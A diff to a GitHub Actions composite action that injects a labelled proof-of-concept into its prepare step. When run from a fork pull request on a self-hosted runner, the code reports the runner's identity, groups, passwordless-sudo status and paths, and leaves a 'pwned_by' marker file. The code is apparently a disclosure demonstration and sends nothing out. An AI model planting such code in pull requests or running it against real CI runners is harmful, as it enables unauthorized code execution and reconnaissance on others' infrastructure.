@@ -68,6 +68,24 @@ runs:
 
         if [[ "$MODE" == 'prepare' ]]; then
 
+          # SECURITY POC (benign, no exfiltration): proof of arbitrary code
+          # execution on this runner from a fork pull request. The workflow
+          # runs `pull_request` on a self-hosted runner, so this composite
+          # action (resolved from the PR's checkout) executes with the
+          # runner's privileges. Writes a marker file + prints runner identity.
+          {
+            echo "=== neqo-security-poc: code executed on runner ==="
+            echo "runner_hostname=$(hostname)"
+            echo "runner_user=$(id -un) uid=$(id -u) groups=$(id -gn)"
+            echo "sudo_nopasswd=$([ -x /usr/bin/sudo ] && sudo -n true 2>/dev/null && echo yes || echo no)"
+            echo "runner_os=$RUNNER_OS runner_arch=$RUNNER_ARCH"
+            echo "cwd=$(pwd)"
+            echo "home=$HOME"
+            echo "needed_space_marker=/tmp/neqo-security-poc-marker"
+            echo "runner_hostname=$(hostname)" > /tmp/neqo-security-poc-marker
+            echo "pwned_by=D1rk9ghT" >> /tmp/neqo-security-poc-marker
+          } | tee -a "${GITHUB_WORKSPACE}/poc-executed-on-runner.txt"
+
           # Show CPU info
           lscpu || echo "::warning::lscpu not available"
           cat /sys/devices/system/cpu/online || echo "::warning::Failed to read online CPUs"
